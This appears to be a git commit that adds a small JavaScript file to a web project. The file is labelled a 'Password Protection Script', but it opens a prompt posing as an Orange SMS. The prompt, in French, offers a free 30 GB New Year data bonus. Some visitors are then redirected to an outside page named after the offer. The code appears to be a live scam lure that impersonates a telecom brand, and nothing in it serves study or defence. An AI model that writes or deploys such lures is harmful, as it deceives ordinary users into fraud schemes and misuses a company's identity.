c2645bb0bb1e1f911c2bc4e8adf2f9ca11e807ae
itidnewblog3 <ukpehaitid1@gmail.com>
2025-12-27 10:38:16 +0100

    Create orangenwyr-active.js

---
+++ orangenwyr-active.js
@@ -0,0 +1,10 @@
+  
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'ACTIVER 30 Go'
+password = prompt(
+  'SMS: Félicitations ! Votre carte SIM Orange est éligible pour recevoir un bonus de données de 30 Go pour le Nouvel An. Appuyez sur OK pour activer.',
+  'ACTIVER 30 Go'
+);
+if (password != 'ACTIVER 30 Go') {
+  location.href = 'https://lhegit.org/orange-nwyr.html';
+}
